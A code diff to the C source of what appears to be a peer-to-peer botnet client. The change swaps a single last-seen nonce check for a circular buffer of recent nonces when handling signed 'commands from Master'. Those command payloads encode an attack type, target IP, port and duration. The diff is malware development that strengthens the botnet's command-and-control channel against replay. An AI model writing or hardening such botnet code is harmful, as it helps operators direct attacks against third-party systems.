@@ -18,6 +18,23 @@
 static Neighbor table[MAX_NEIGHBORS];
 static int neighbor_count = 0;
 
+// Nonce Replay Protection (Circular Buffer)
+#define NONCE_BUFFER_SIZE 64
+static uint32_t nonce_buffer[NONCE_BUFFER_SIZE];
+static int nonce_index = 0;
+
+static bool is_nonce_seen(uint32_t nonce) {
+    for (int i = 0; i < NONCE_BUFFER_SIZE; i++) {
+        if (nonce_buffer[i] == nonce) return true;
+    }
+    return false;
+}
+
+static void add_nonce(uint32_t nonce) {
+    nonce_buffer[nonce_index] = nonce;
+    nonce_index = (nonce_index + 1) % NONCE_BUFFER_SIZE;
+}
+
 int p2p_init(void) {
     // Zero out table
     memset(table, 0, sizeof(table));
@@ -121,19 +138,16 @@ void p2p_handle_packet(int sock) {
         if (offset + payload_len > len) return;
         uint8_t *payload = buffer + offset;
         
-        // Replay Protection (Simple Monotonic or Cache)
-        // For simplicity/robustness without time sync, we verify signature FIRST.
-        // But to save CPU, we should check if we already processed this nonce.
-        // TODO: Add a circular buffer of recently seen nonces.
-        // For now, we assume simple strict implementation:
-        
-        static uint32_t last_seen_nonce = 0;
-        if (nonce == last_seen_nonce) return; // Simple dedupe
+        // Replay Protection (Circular Buffer)
+        if (is_nonce_seen(nonce)) {
+            // Already processed this nonce, skip
+            return;
+        }
 
         // Verify Signature
         if (ed25519_verify(payload, payload_len, sig)) {
             // Valid Command from Master!
-            last_seen_nonce = nonce;
+            add_nonce(nonce);  // Remember this nonce
             
             // Payload Format: [AttackType(1)] [IP(4)] [Port(2)] [Duration(4)]
             if (payload_len >= 11) {
